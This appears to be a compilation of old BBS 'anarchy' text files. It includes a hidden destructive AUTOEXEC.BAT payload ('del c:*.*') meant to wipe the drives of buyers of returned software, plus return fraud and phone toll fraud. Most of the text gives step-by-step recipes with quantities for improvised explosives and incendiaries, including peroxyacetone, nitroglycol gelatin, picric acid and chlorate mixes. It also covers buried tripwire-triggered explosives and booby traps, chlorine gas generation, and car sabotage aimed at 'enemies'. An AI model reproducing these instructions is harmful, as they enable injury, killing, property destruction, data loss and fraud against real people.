report any disturbances to the fone co. if she sees it again.



Simple Virus/Easy Way To Return A Copied Program  (hehe!)

-when you buy a game, or something from a computer store, copy it, 
and want to return it (I know all of you do this), sometimes all the 
store does is re-cellophane it and it goes back on the shelves 
without being re-tested.  If the original floppies have an 
AUTOEXEC.BAT file on them to initiate the copying/decompression at 
boot-up, simply edit it to say:

cd\
del c:*.*
y

That'll make someone's day real funny, especially if the store tries 
to test it.  Or, in most cases the store will not accept returned 
merchandise if it is not defective, so DEFECT IT.  This is done by 
using a program that shows the date and time the originals were last 
modified (check for this BEFORE installing the program!!!!!!) such as 
Dosshell, or XTGold.  Then set the date and time on your computer to 
match the originals date and time (approx).  Install the program, 
and/or copy the originals and manuals.  Now fuck around with 
the decompression file (usually PKUNZIP), the installation file, and 
any others you see.  Now the store has no reason, and MUST accept 
the product as a return, or sometimes they will give you a return 
check for the $$, and send the program back to the manufacturer, 
which is good, because it will then be recopied, resealed, and put 
back on the shelves somewhere for another phreaker to HACK!!

(If the above date/time matching is too much of a pain for the 
really retarded out there, set your computer date/time to any past 
ones close to the originals, and fuck with ALL the files, thus 
making them all match.)



Battery Bombs:

-Batteries like Duracell, Eveready, Energizer, etc... are specially 
made for home use and will not under any condition, explode when 
simply connected to each other.  Therefore, generic batteries are 
required.  These batteries can be obtained in hick country, or from 
a shitty wholesaler.  I've heard of phriends putting 9Vs in the 
fucking microwave for a minute or so, and this is supposed to 
disable the "exploder protector", but anyone who puts batteries in a 
microwave, should have the batteries explode on them.  EXODUS takes no 
responsibility for anything in this file!!!  I never found out if 2 
9v batts connected really do explode.  I hope so.


Any Blue Boxers??

-Not many people use blue boxes these days.  They've become an 
eminent danger to phreakers. Ma Bell has new equipment to detect the 
use of tone-emmitting boxes, and about the only safe place to box 
calls from is the handy-dandy pay phone at the end of the block. 
The only way to box calls today is to switch off to another 
switching system with another number:  ie-

-call a store like Toys-'R'-Us, (1-908-322-6065 Livingston, NJ) and 
ask for the technical (video game) department.  This switches the 
number from the above to the extension of the department, usually 
and extension, but it can be a totally different # you are sent to 
while you are on hold.  This is VERY good. Bullshit the employee at 
the tech dept., and wait for HIM to hang up first.  That disconnects 
you from his department, but not from the innerconnections of the 
store. (it might even be possible to dial a number and get another 
department at this point).  This is like 'stacking' trunks. Their 
dialtone (inside the store) may have a slightly higher/lower pitch 
than a dialtone at your house.  This is what you want.  Now, blow 
2600 accross the line, and you should have access to a trunk, and 
Bell Labs think that the store did it, and it is not usually 
questioned because the computer might think that it is part of their 
paging system. (not 100% sure, test around)

-when someone (preferably who you don't give a shit about) calls, 
dial *69 to ring him back.(if your area suscribes to this feature)
What sould happen is that the *69 tone asks the Bell computer to 
call back the person.  The COMPUTER does the calling at this point.  
Now when your friend picks up, bullshit him into hanging up first.  
Now the computer is getting the dialtone first, then it passes it on 
to you.  If you blow 2600 at this point, the computer may think it 
is its own equipment doing the calling.  I'm REALLY not sure about 
this one.  Hopefully this one works, but I can't test it because 
some fucked up, shit full, douche nozzle, pig fucker broke my 
MF box. <frown> MF boxes are not that hard to come by.  Many hobby 
shops, music instrument stores, or electronic stores may sell the MF 
box itself, or one that detects tones, which can be used in the 
reverse way.


Good Technical Phone Numbers:

-sometimes the hardest part of getting technical support is finding 
a place to look.  An easy place is M.I.T. (HOME OF THE ORIGINAL 
PHREAKS) Find the number for the Electronic engineering campus, call 
and say you would like the number for (give room # make one up if 
you have to), or call the person incharge of dorm assignments (buy a 
college book if you need to).  Enentually, if done right, you will 
have a list of possible #s, and set your modem on scan, and look for 
carrier detect.  One of these nerds...ahm! I mean Geniuses must have 
a computer with a modem, and these guys will answer about 100% of 
your technical problems.



Practical Jokes:

-if you are into practical jokes like I am, than here is a book for 
you:

"The Second Official Handbook of Practical Jokes"

by: Peter Van Der Linden

There are hundreds of good practical jokes and phone scams, as well 
as a section of computer jokes, with a whole program of re-writing 
the COMMAND.COM file to be funnier than ever.

PART 2 - Tennis ball cannons 
------   Information from the Usenet.  The Usenet is a worldwide network of      
         15,000 machines and over 500,000 people- And growing!

         Addendum by The Editor:   If you aren't in the Chicago area,
         check a local BBS list.  If you see a BBS which runs under UNIX,
         odds are it carries usenet.  The appropriate place to look is 
         rec.pyrotechnics.

At this time (twelve years ago) most soft drink cans were rolled tin rather
than the molded aluminum.  We would cut the tops and bottoms off of a  bunch
of them and tape them together with duct tape, forming a tube  of two feet or
more.

        At the end we would tape a can with the bottom  intact, more holes
punched (with a can opener) around the top, and a  small hole in the side at
the base. We then fastened this contraption to a tripod so we could aim it
reliably. Any object that came somewhat close to filling the tube was then
placed therein.

        In the shop, we used the clock as a target and an empty plastic
solder spool as ammunition, with tape over the ends of the center hole and
sometimes filled with washers for weight.  When taken to parties or picnics,
we would use whatever was handy.  Hot dog rolls or napkins filled with  potato
chips provided spectacular entertainment.
 
        Once loaded, a small amount of lighter fluid was poured into the hole
in  the side of the end can and allowed to vaporize for a few moments.  The
"fire control technician" would announce "Fire in the Hole" and ignite  it.
 
BOOM!  Whoosh!  The clock never worked after that! 
---------- 

    Our version of the potato chip cannon, originally designed around the
Pringles potato chip can, was built similarly.  Ours used coke cans, six with
the top and bottom removed, and the  seventh had Bottle opener holes all
around one end, the top of this can was covered with a grid or piece of wire
screening to keep the tennis ball from falling all the way to the bottom.
This was spiral  wrapped with at least two rolls of duct tape.

     A wooden shoulder rest  and forward hand grip was taped to the tube.  For
ignition we used  lantern batteries to a model-t coil, actuated by a push
button on  the hand grip.  A fresh wilson tennis ball was stuffed all the way
back to the grid, and a drop or two of lighter fluid was dropped in  one of
two holes in the end.  The ignition wire was poked through  the other hole.
 
    We would then lie in ambush, waiting for somthing to move.  When fired
with the proper air/fuel mixture, a satisfying thoomp!  At maximum range  the
ball would travel about 100 yards with a 45 degree launch angle.  Closer up
the ball would leave a welt on an warring opponent.  When  launched at a
moving car the thud as it hit the door would generally  rattle anyone inside.
Luckily we never completed the one that shot golf balls.

                    More Fun Stuff for Terrorists

                             Carbide Bomb

This is EXTREMELY DANGEROUS. Exercise extreme caution.... Obtain some calcium
carbide. This is the stuff that is used in carbide lamps and can be found at
nearly any hardware store.
    Take a few pieces of this stuff (it looks like gravel) and put it in a
glass jar with some water. Put a lid on tightly. The carbide will react with
the water to produce acetylene carbonate which is similar to the gas used in
cutting torches.
    Eventually the glass with explode from internal pressure. If you leave a
burning rag nearby, you will get a nice fireball!
                      Auto Exhaust Flame Thrower

For this one, all you need is a car, a sparkplug, ignition wire and a switch.
Install the spark plug into the last four or five inches of the tailpipeby
drilling a hole that the plug can screw into easily. Attach the wire (this is
regular insulated wire) to one side of the switch and to the spark plug. The
other side of the switch is attached to the positive terminal on the battery.
With the car running, simply hit the switch and watch the flames fly!!! Again be
careful that no one is behind you! I have seen some of these flames go 20
feet!!!

        Balloons are fun to play with in chem lab, fill them with the gas

that are always smoking, they love to pop balloons with lit cigarette.... get
the picture? Good...

   PYROTECHNICAL DELIGHTS
                               WRITTEN BY RAGNER ROCKER

  Many of you out there probably have fantasies of revenge against teachers,
principals and other people who are justassholes.  depending on your level of
hatred of this person i would advise that you do some of these following
experiments:

  (1) Pouring dishsoap into the gas tank of your enemy- many of you already
know that gasoline + dishsoap(e.g.  joy, palmolive, etc.) form a mixture
called napalm.  now napalm is a jelly-like  substance used in bombs,
flamethrowers, etc.  now you can only guess what this mixture would do to
someone's fuel line!!!!

  (2) Spreading dirty motor oil/castor oil on someone's exhaust pipe- when
the exhaust pipe heats up(and it will!!)the motor oil or castor oil on the pipe
will cause thick, disgusting smoke to ooze forth from the back of that car.
Who knows maybe he/she might be pulled over and given a ticket!!

  (3) Light Bulb Bomb- see part one of the file

 (4) Simple smoke/stink bomb- you can purchaase sulphur at a drugstore under
the name flowers of sulphur.  now when sulphur burns it will give off a very
strong odor and plenty of smoke.  now all you need is a fuse from a
firecracker, a tin can, and the sulphur.  fill the can with sulphur(pack very
lightly), put aluninum foil over the top of the can, poke a small hole into
the foil, insert the wick, and light it and get out of the room if you value
your lungs.  you can find many uses for this( or at least i hope so.
 
                               FUN WITH ALARMS
 
    A fact I forgot to mention in my previous alarm articles is that one can
also use polyurethane foam in a can to silence horns and bells.  You can
purchase this at any hardware store as insulation.  it is easy to handle and
dries faster.

Many people that travel carry a pocket alarm with them.  this alarm is a small
device that is hung around the door knob, and when someone touches the knob his
body capacitance sets off the alarm.  these nasty nuisences can be found by
walking down the halls of a hotel and touching all the door knobs very quickly.
if you happen to chance upon one, attach a 3' length of wire or other metal
object to the knob.  this will cause the sleeping business pig inside to think
someone is breaking in and call room service for help.  all sorts of fun and
games will ensue.

    Some high-security instalations use keypads just like touch-tone pads (a
registered trade mark of bell systems) to open locks or disarm alarms.  most
use three or four digits.  to figure out the code, wipe the key-pad free from
all fingerprints by using a rag soaked in rubbing alcohol.  after the keypad
has been used just apply finger print dust and all four digits will be marked.
now all you have to do is figure out the order. if you want to have some fun
with a keypad, try pressing the * and # at the same time.  many units use this
as a panic button. This will bring the owner and the cops running and ever-one
will have a good time.  never try to remove these panels from the wall, as
they have built-in tamper switches.
 
    On the subject of holdups, most places (including supermarkets, liqour
stores, etc.) have what is known as a money clip.  these little nasties are
placed at the bottom of a money drawer and when the last few bills are
with-drawn a switch closes and sets the alarm off.  that's why when you make
your withdrawl it's best to help yourself so you can check for these little
nasties.  if you find them, merely insert ones underneath the pile of
twenties, and then pull out the twenties, leaving the one-dollar bill behind
to prevent the circuit from closing.

1) Put 1 teaspoon full of of potassium permanganate in a tin can.
2) add a few drops of glycerine
3) wait 3-4 min.
4) get the hell out..  the stuff will smoke, then burst into flame..

** potasium permanganate stains like iodine but worse [it's purple]

EXPLOSIVES AND INCENDIARIES by THE RESEARCHER

INTRODUCTION: The trouble with text books on chemistry and explosives is the
attitude with which they are written.  They don't say, "Now I know you would
like to blow holy hell out of something just for the fun of it so here is how
to whip up something in your kitchen to do it".  They tell you how Dupont does
it or how the anchient Chinese did it but not how you can do it with the
resourses and materials available to you.

 Even army manuals on field expedient explosives are almost useless because
they are just outlines written with the understanding that an instructor is
going to fill in the blanks.  It is a fun game to search out the materials
that can be put together to make something go "boom".  You can find what you
need in grocery stores, hardware stores, and farm supplies.  An interesting
point to remember is that it is much easier to make a big e explosion than a
small one.  It is very difficult for a home experimenter to make a
firecracker, but a bomb capable of blowing the walls out of a building is
easy.

                           HOW TO MAKE ROCKET FUEL

   This is easy to make and fun to play with.  Mix equal parts by volume
Potassium or Sodium Nitrate and granulated sugar.  Pour a big spoonful of
this into a pile. Stick a piece of blackmatch fuse into it; light; and step
back.  This is also a very hot incendiary.  A little imagination will suggest
a lot of experiments for this.

                             ANOTHER ROCKET FUEL

 Mix equal parts by volume of zinc dust and sulfur.  Watch out if you
experiment with this.  It goes off in a sudden flash.  It is not a powerful
explosive, but is violent stuff even when not confined because of its fast
burning rate.

  --- As I continue from this point some of the ingredients are going to be
harder to get without going through a chemical supply.  I try to avoid this.
I happen to know that B. Prieser Scientific (local to my area) has been
instructed by the police to send them the names of anyone buying chemicals in
certain combinations.  For example, if a person were to buy Sulfuric acid,
Nitric acid and Toluene (the makings for TNT) in one order the police would be
notified.  I will do the best I can to tell you how to make the things you
need from commonly available materials, but I don't want to leave out
something really good because you might have to scrounge for an ingredient.  I
am guessing you would prefer it that way.


                 HOW TO MAKE AN EXPLOSIVE FROM COMMON MATCHES

  Pinch the head near the bottom with a pair of wire cutters to break it up;
then use the edges of the cutters to scrape off the loose material.  It gets
easy with practice.  You can do this while watching TV and collect enough for
a bomb without dying of boredom.
    Once you have a good batch of it, you can load it into a pipe instead of
black powder.  Be careful not to get any in the threads, and wipe off any that
gets on the end of the pipe.  Never try to use this stuff for rocket fuel.  A
science teacher was killed that way.
      Just for fun while I'm on the subject of matches, did you know that you
can strike a safety match on a window pane? Hold a paper match between your
thumb and first finger.  With your second finger, press the head firmly
against a large window.  Very quickly, rub the match down the pane about 2
feet while maintaining the pressure.  The friction will generate enough heat
to light the match.

  Another fun trick is the match rocket.  Tightly wrap the top half of a paper
match with foil.  Set it in the top of a pop bottle at a 45 degree angle.
Hold a lighted match under the head until it ignites.  If you got it right,
the match will zip up and hit the ceiling.

 I just remembered the match guns I used to make when I was a kid.  These are
made from a bicycle spoke.  At one end of the spoke is a piece that screws
off.  Take it off and screw it on backwards.  You now have a piece of stiff
wire with a small hollow tube on one end.  Pack the material from a couple of
wooden safety matches into the tube.  Force the stem of a match into the hole.
It sould fit very tightly.  Hold a lighted match under the tube until it gets
hot enough to ignite the powder.  It goes off with a bang.


           HOW TO MAKE CONCENTRATED SULFURIC ACID FROM BATTERY ACID

 Go to an auto supply store and ask for "a small battery acid".  This should
only cost a few dollars.  What you will get is about a gallon of dilute
sulfuric acid.  Put a pint of this into a heat resistant glass container.  The
glass pitchers used for making coffee are perfect. Do not use a metal container.

  Use an extension cord to set up a hotplate out doors.  Boil the acid until
white fumes appear.  As soon as you see the white fumes, turn off the hot
plate and let the acid cool.  Pour the now concentrated acid into a glass
container.  The container must have a glass stopper or plastic cap -- no
metal.  It must be air tight.  Otherwize, the acid will quickly absorb
moisture from the air and become diluted.  Want to know how to make a time
bomb that doesn't tick and has no wires or batteries? Hold on to your acid and
follow me into the next installment.

                   HOW TO MAKE A CHEMICAL TIME DELAY FUSE:

    To get an understanding of how this is going to work, mix up equal parts
by volume Potassium chlorate and granulated sugar.  Pour a spoonful of the
mixture in a small pile and make a depression in the top with the end of a
spoon.  Using a medicine dropper, place one drop of concentrated sulfuric acid
in the depression and step back.
     It will snap and crackle a few times and then burst into vigorous flames.
To make the fuse, cut about 2 inches off a plastic drinking straw.  Tamp a
small piece of cotton in one end.  On top of this put about an inch of the
clorate/sugar mixture.
    Now lightly tamp in about a quarter inch of either glass wool or asbestos
fibers.  Secure this with the open end up and drop in 3 or 4 drops of sulfuric
acid.  After a few minutes the acid will soak through the fibers and ignite
the mixture.
    The time delay can be controled by the amount of fiber used and by varying
how tightly it is packed.  Don't use cotton for this.  The acid will react
with cotton and become weakened in the process.  By punching a hole in the
side of the straw, a piece of blackmatch or other fuse can be inserted and
used to set off the device of your choice.

     Potassium chlorate was very popular with the radical underground.  It can
be used to make a wide variety of explosives and incendiaries, some of them
extremely dangerous to handle.  The radicals lost several people that way.
But, don't worry.  I am not going to try to protect you from yourself.  I have
decided to tell all.  I will have more to say about Potassium chlorate, but
for now, let's look at a couple of interesting electric fuses.


                                PEROXYACETONE

 PEROXYACETONE IS EXTREMELY FLAMMABLE AND HAS BEEN REPORTED TO BE SHOCK
 SENSITIVE.

MATERIALS-
 4ML ACETONE
 4ML 30% HYDROGEN PEROXIDE
 4 DROPS CONC.  HYDROCHLORIC ACID
 150MM TEST TUBE

Add 4ml acetone and 4ml hydrogen peroxide to the test tube.  then add 4 drops
concentrated hydrochloric acid. In 10-20 minutes a white solid should begin to
appear. if no change is observed, warm the test tube in a water bath at 40
celsius. Allow the reaction to continue for two hours.  Swirl the slurry and
filter it. Leave out on filter paper to dry for at least two hours.  To
ignite, light a candle tied to a meter stick and light it (while staying at
least a meter away) .

I would like to give credit to a book by shakashari entitled "Chemical
demonstrations" for a few of the precise amounts of chemicals in some
experiments.

THE CHEMIST'S CORNER #2:    HOUSEHOLD CHEMICALS, BY ZAPHOD BEEBLEBROX/MPG

 This article deals with instructions on how to do some interesting
experiments with common household chemicals.  Some may or may not work
depending on the concentration of certain chemicals in different areas and
brands.  I would suggest that the person doing these experiments have some
knowledge of chemistry, especially for the more dangerous experiments.

 I am not responsible for any injury or damage caused by people using this
information.  It is provided for use by people knowledgable in chemistry who
are interested in such experiments and can safely handle such experiments.

I.  A LIST OF HOUSEHOLD CHEMICALS AND THEIR COMPOSITION

VINEGAR: 3-5% ACETIC ACID              BAKING SODA: SODIUM BICARBONATE
DRAIN CLEANERS: SODIUM HYDROXIDE       SANI-FLUSH: 75% SODIUM BISULFATE
AMMONIA WATER: AMMONIUM HYDROXIDE      CITRUS FRUIT: CITRIC ACID
TABLE SALT: SODIUM CHLORIDE            SUGAR: SUCROSE
MILK OF MAGNESIA-MAGNESIUM HYDROXIDE   TINCTURE OF IODINE- 4% IODINE
RUBBING ALCOHOL- 70 OR 99% (DEPENDS ON BRAND) ISOPROPYL ALCOHOL (DO NOT DRINK!)


                           GENERATING CHLORINE GAS

 This is slightly more dangerous than the other two experiments, so you
shouild know what you're doing before you try this...

 Ever wonder why ammonia bottles always say 'do not mix with chlorine bleach',
and visa-versa? That's because if you mix ammonia water with ajax or something
like it, it will give off chlorine gas. To capture it, get a large bottle and
put ajax in the bottom.  then pour some ammonia down into the bottle.  since
the c hlorine is heavier than air, it will stay down in there unless you use
large amounts of either ajax or ammonia (don't!).


                            CHLORINE + TURPENTINE

 Take a small cloth or rag and soak it in turpentine. Quickly drop it into the
bottle of chlorine. It should give off a lot of black smoke and probably start
burning...

                           GENERATING HYDROGEN GAS

 To generate hydrogen, all you need is an acid and a metal that will react
with that acid.  Try vinegar (acetic acid) with zinc, aluminum, magnesium,
etc.  You can collect hydrogen in something if you note that it is lighter
than air....  light a small amount and it burns with a small *pop*.

  Another way of creating hydrogen is by the electrolysis of water.  this
involve sseperating water (H2O) into hydrogen and oxygen by an electric
current. To do this, you need a 6-12 volt battery (or a DC transformer), two
test tubes, a large bowl, two carbon electrodes (take them out of an unworking
6-12 volt battery), and table salt. Dissolve the salt in a large bowl full of
water. Submerge the two test tubes in the water and put the electrodes inside
them, with the mouth of the tube aiming down.  Connect the battery to some
wire going down to the electrodes.

   This will work for a while, but chlorine will be generated along with the
oxygen which will corrode your copper wires leading to the carbon
electrodes...  (the table salt is broken up into chlorine and sodium ions, the
chlorine comes off as a gas with oxygen while sodium reacts with the water to
form sodium hydroxide....).  therefore, if you can get your hands on some
sulfuric acid, use it instead.  it will not affect the reaction other than
making the water conduct electricity.

WARNING:  DO NOT use a transformer that outputs AC current! Not only is AC
         inherently more dangerous than DC, it also produces both Hydrogen and
         Oxygen at each electrode.


                             HYRDOGEN + CHLORINE

 Take the test tube of hydrogen and cover the mouth with your thumb. Keep it
inverted, and bring it near the bottle of chlorine (not one that has reacted
with turpentine).  Say "goodbye test tube", and drop it into the bottle.  The
hydrogen and chlorine should react and possibly explode (depending on purity
and amount of each gas).  An interesting thing about this is they will not
react if it is dark and no heat or other energy is around. When a light is
turned on, enough energy is present to cause them to react...

                            PREPARATION OF OXYGEN

    Get some hydrogen peroxide (from a drug store) and manganese dioxide (from
a battery- it's a black powder).  Mix the two in a bottle, and they give off
oxygen. If the bottle is stoppered, pressure will build up and shoot it off.

     Try lighting a wood splint and sticking it (when only glowing) into the
bottle. The oxygen will make it burst into flame. The oxygen will allow things
to burn better...

                                    IODINE

   Tincture of iodine contains mainly alcohol and a little iodine.  To
seperate them, put the tincture of iodine in a metal lid to a bottle and heat
it over a candle.  Have a stand holding another metal lid directly over the
tincture (about 4-6 inches above it) with ice on top of it.  The alcohol
should evaporate, and the iodine should sublime, but should reform iodine
crystals on the cold metal lid directly above.  If this works (I haven't
tried), you can use the iodine along with household ammonia to form nitrogen
triiodide.
                                            ...ZAPHOD BEEBLEBROX/MPG!

   I have found that Pool Chlorine tablets with strong household ammonia react
to produce LOTS of chlorine gas and heat... also mixing the tablets with
rubbing alcohol produces heat, a different (and highly flammable) gas, and
possibly some sort of acid (it eats away at just about anything it touches)

                                  TRIPWIRES
         by The Mortician

    Well first of all I reccommend that you read the file on my board about
landmines...  If you can't then here is the concept.

  You can use an m-80,h-100, blockbuster or any other type of explosive that
will light with a fuse. Now the way this works is if you have a 9 volt
battery, get either a solar igniter (preferably) or some steel wool you can
create a remote ignition system.  What you do it set up a schematic like this.

  ------------------>+ batery
 steel ||          ->- batery
 wool ||            /
 :==:--- <--fuse    \
  ||                /
  ---- spst switch--\

   So when the switch is on the currnet will flow through the steel wool or
igniter and heat up causing the fuse to light.
  Note: For use with steel wool try it first and get a really thin piece of
wire and pump the current through it to make sure it will heat up to light the
explosive.

   Now the thing to do is plant your explosive wherever you want it to be,bury
it and cover the wires.  Now take a fishing line (about 20 lb. test) and tie
one end to a secure object.  Have your switch secured to something and make a
loop on the other end on the line. Put the loop around the switch such that
when pulled it will pull the switch and set off the explosive.

   To ignite the explosive...  The thing to do is to experiment with this and
find your best method...  Let me know on any good kills, or new techniques...

  BOOBY TRAP TRIP WIRES......      BY Vlad Tepes (of Chgo C64 fame)

   Here is a method for constructing boobytraps which I personally invented,
and which I have found to work better than any other type of release booby
trap.

    There are many possible variations on this design, but the basic premise
remains the same. What you'll need:

  3-4 nails each 2 inches long and soft enough to
      bend easily (galvanized iron works well)
    6 feet of wire or fishing line
 5-15 feet of strong string or rope
    1 really sick mind.

    Hammer two of the nails into the trunk of a tree (about one inch apart) so
they form a horizontal line. They should be angled slightly upward, about 30
degrees.

    Bend each nail Downward about one inch out from the trunk. Take your
nefarious device (say a small rock suspended in a tree) and rig a rope or
string so the line comes DOWN towards the two nails. Tie a loop in the string
so the loop *just* reaches between the two nails, and pass a third nail
between the two nails with the loop around this nail between the two others
(see diagrams)

      bent nails
     /                        || ^ slight upward tension
# /\                          ||
#/                         @  ||    @         ( @ are the two nails, head on)
#                  ------!----()------
#          trip wire
 \                     /
Trunk                 third nail

    Now tie one end of the fishing line to the head of the third nail, and the
other end around another tree or to a nail (in another tree, a root or a
stump etc).

    When somebody pulls on the trip wire, the nail will be pulled out and your
sick creation will be released to do it's damage (try tying it to a firing
pin).

  There are several possible variations. More than one trip wire can be
attached to the same nail, or this device can be used to arm a second trip
wire. Large wire staples or hook and eye loops can be used to replace the two
bent nails.

     A more interesting variation uses a straight piece of metal rod with a
hole at each end, or with a short wire loop welded to each end. One end is
attached to the tripwire, the other is attached to a spring.

               ||

  SPRING     BOLT            Trip wire

    With this design the loop will be released if the tripwire is pulled or if
it is broken. The spring should be under moderate tension and well oiled.


                            Improvised Explosives
Gelatine Explosive from Anti-Freeze         Written by: The Lich

CAUTION: THIS FORMULA ASSUMES THAT THE MAKER HAS NO QUALMS ABOUT KILLING
         HIS/HER SELF IN THE PROCESS.

 This explosive is almost the same as the nitro-gelatin plastique explosive
exept that it is supple and pliable to -10 to -20 deg. C

   Antifreeze is easier to obtain than glycerine and is usually cheaper.  It
needs to be freed of water before the manufacture and this can be done by
treating it with calcium chloride until a specific gravity of 1.12 @ o deg.
C.  or 1.11 @ 20 deg.  C.  is obtained.

    This can be done by adding calcium chloride to the antifreeze and checking
with a hydrometer and continue to add calcium chloride until the proper
reading is obtained.  The antifreeze is then filtered to remove the calcium
chloride from the liquid.  This explosive is superior to nitro-gelatin in that
it is easier to collidon the IMR smokeless powder into the explosive and that
the 50/50 ether ethyl alcohol can be done away with.  It is superior in that
the formation of the collidon is done very rapidly by the nitroethelene
glycol.

   It's detonation properties are practically the same as the nitro-gelatine.
Like the nitro-gelatine it is highly flammable and if caught on fire the
chances are good that the flame will progress to detonation.  In this
explosive as in nitro-gelatine the addition of 1% sodium carbonate is a good
idea to reduce the chance of recidual acid being present in the final
explosive.  The following is a slightly different formula than nitro-gelatine:

Nitro-glycol 75%  Guncotton (IMR) 6%  Potassium Nitrate  14%   Flour 5%

    In this process the 50/50 step is omitted.  Mix the potassium nitrate with
the nitro-glycol.  Remember that this nitro-glycol is just as sensitive to
shock as is nitroglycerin.
    The next step is to mix in the baking flour and sodium carbonate. Mix
these by kneading with gloved hands until the mixture is uniform.  This
kneading should be done gently and slowly.  The mixture should be uniform when
the IMR smokeless powder is added.  Again this is kneaded to uniformity.  Use
this explosive as soon as possible.

    If it must be stored, store in a cool, dry place (0-10 deg.  C.).  This
explosive should detonate at 7600-7800 m/sec..  These two explosives are very
powerful and should be sensitive to a #6 blasting cap or equivelent.

    These explosives are dangerous and should not be made unless the
manufacturer has had experience with this type compound.  The foolish and
ignorant may as well forget these explosives as they won't live to get to use
them.
    Don't get me wrong, these explosives have been manufactured for years with
an amazing record of safety.  Millions of tons of nitroglycerine have been
made and used to manufacture dynamite and explosives of this nature with very
few mis haps.
   Nitroglycerin and nitroglycol will kill and their main victims are the
stupid and foolhardy.  Before manufacturing these explosives take a drop of
nitroglycerin and soak into a small piece of filter paper and place it on an
anvil.
  Hit this drop with a hammer and don't put any more on the anvil.  See what I
mean! This explosive compound is not to be taken lightly.  If there are any
doubts DON'T.

Improvised Explosives Plastique Explosive from Aspirin    by: The Lich

 This explosive is a phenol dirivative.  It is HIGHLY toxic and explosive
compounds made from picric acid are poisonous if inhaled, ingested, or handled
and absor- bed through the skin.  The toxicity of this explosive restrict's
its use due to the fact that over exposure in most cases causes liver and
kidney failure and sometimes death if immediate treatment is not obtained.

 This explosive is a cousin to T.N.T.  but is more powerful than it's cousin.
It is the first explosive used militarily and was adopted in 1888 as an
artillery shell filler.  Originally this explosive was derived from coal tar
but thanks to modern chemistry you can make this explosive easily in
approximately three hours from acetylsalicylic acid (aspirin purified).

 This procedure involves dissolving the acetylsalicylic acid in warm sulfuric
acid and adding sodium or potassium nitrate which nitrates the purified
aspirin and the whole mixture drowned in water and filtered to obtain the
final product.  This explosive is called trinitrophenol.  Care should be
taken to ensure that this explosive is stored in glass containers.  Picric
acid will form dangerous salts when allowed to contact all metals exept tin
and aluminum.  These salts are primary explosive and are super sensitive.
They also will cause the detonation of the picric acid.

 To make picric acid obtain some aspirin.  The cheaper brands work best but
buffered brands should be avoided.  Powder these tablets to a fine
consistancy. To extract the acetylsalicylic acid from this powder place this
powder in methyl alcohol and stir vigorously.  Not all of the powder will
dissolve.  Filter this powder out of the alcohol.  Again wash this powder that
was filtered out of the alcohol with more alcohol but with a lesser amount
than the first extraction.  Again filter the remaining powder out of the
alcohol.  Combine the now clear alcohol and allow it to evaporate in a pyrex
dish.  When the alcohol has evaporated there will be a surprising amount of
crystals in the bottom of the pyrex dish.

 Take forty grams of these purified acetylsalicylic acid crystals and
dissolve them in 150 ml.  of sulfuric acid (98%, specify gravity 1.8) and heat
to diss- olve all the crystals.  This heating can be done in a common electric
frying pan with the thermostat set on 150 deg.  F.  and filled with a good
cooking oil.

When all the crystals have dissolved in the sulfuric acid take the beaker,
that you've done all this dissolving in (600 ml.), out of the oil bath.  This
next step will need to be done with a very good ventilation system (it is a
good idea to do any chemistry work such as the whole procedure and any
procedure on this disk with good ventilation or outside).  Slowly start adding
58 g.  of sodium nitrate or 77 g.  of potassium nitrate to the acid mixture in
the beaker very slowly in small portions with vigorous stirring.  A red gas
(nitrogen trioxide) will be formed and this should be avoided.

  The mixture is likely to foam up and the addition should be stopped until
the foaming goes down to prevent the overflow of the acid mixture in the
beaker.  When the sodium or potassium nitrate has been added the mixture is
allowed to cool somewhat (30- 40 deg.  C.). The solution should then be dumped
slowly into twice it's volume of crushed ice and water.  The brilliant yellow
crystals will form in the water. These should be filtered out and placed in
200 ml.  of boiling distilled water. This water is allowed to cool and then
the crystals are then filtered out of the water.  These crystals are a very,
very pure trinitrophenol.  These crystals are then placed in a pyrex dish and
places in an oil bath and heated to 80 deg. C.  and held there for 2 hours.
This temperature is best maintained and checked with a thermometer.

  The crystals are then powdered in small quantities to a face powder
consistency.  These powdered crystals are then mixed with 10% by weight wax
and 5% vaseline which are heated to melting temperature and poured into the
crystals.  The mixing is best done by kneading together with gloved hands.
This explosive should have a useful plsticity range of 0-40 deg.  C..  The
detonation velocity should be around 7000 m/sec..  It is toxic to handle but
simply made from common ingredients and is suitable for most demolition work
requiring a moderately high detonation velocity.  It is very suitable for
shaped charges and some steel cutting charges.  It is not as good an explosive
as C-4 or other R.D.X.  based explosives but it is much easier to make.  Again
this explosive is very toxic and should be treated with great care.

  AVOID HANDLING BARE-HANDED, BREATHING DUST AND FUMES, AVOID ANY CHANCE OF
INGESTION. AFTER UTENSILS ARE USED FOR THE MANUFACTURE OF THIS EXPLOSIVE
RETIRE THEM FROM THE KITCHEN AS THE CHANCE OF POISONING IS NOT WORTH THE RISK.
THIS EXPLOSIVE, IF MANUFACTURED AS ABOVE, AHOULD BE SAFE IN STORAGE BUT WITH
ANY HOMEMADE EXPLOSIVE STORAGE OS NOT RECOMENDED AND EXPLOSIVES SHOULD BE MADE
UP AS NEEDED.


Improvised Explosives Plastique Explosive from Bleach     by: The Lich

 This explosive is a potassium chlorate explosive.  This explosive and
explosives of similar composition were used in World War II as the main
explosive filler in gernades, land mines, and mortar used by French, German,
and other forces involoved in that conflict.  These explosives are relatively
safe to manufacture.

  One should strive to make sure these explosives are free of sulfur,
sulfides, and picric acid.  The presence of these compounds result in mixtures
that are or can become highly sensitive and possibly decompose ex- plosively
while in storage.  The manufacture of this explosive from bleach is given as
just an expediant method.  This method of manufacturing potassium chlorate is
not economical due to the amount of energy used to boil the solution and cause
the 'dissociation' reaction to take place.  This procedure does work and
yields a relatively pure and a sulfur/sulfide free product.  These explosives
are very cap sensitive and require only a #3 cap for instigating detonation.

  To manufacture potassium chlorate from bleach (5.25% sodium hypochlorite
solution) obtain a heat source (hot plate etc.) a battery hydrometer, a large
pyrex or enameled steel container (to weigh chemicals), and some potassium
chloride (sold as salt substitute).  Take one gallon of bleach, place it in
the container and begin heating it.  While this solution heats, weigh out 63
g.  potassium chloride and add this to the bleach being heated. Bring this
solution to a boil and boiled until when checked by a hydrometer the reading
is 1.3 (if a battery hydrometer is used it should read full charge).

 When the reading is 1.3 take the solution and let it cool in the refrigerator
until it's between room temperature and 0 deg.  C..  Filter out the crystals
that have formed and save them.  Boil the solution again until it reads 1.3 on
the hydrometer and again cool the solution.  Filter out the crystals that have
formed and save them.  Boil this solution again and cool as before.

  Filter and save the crystals.  Take these crystals that have been saved and
mix them with distilled water in the following proportions: 56 g.  per 100 ml.
distilled water.  Heat this solution until it boils and allow it to cool.
Filter the solution and save the crystals that form upon cooling.  The process
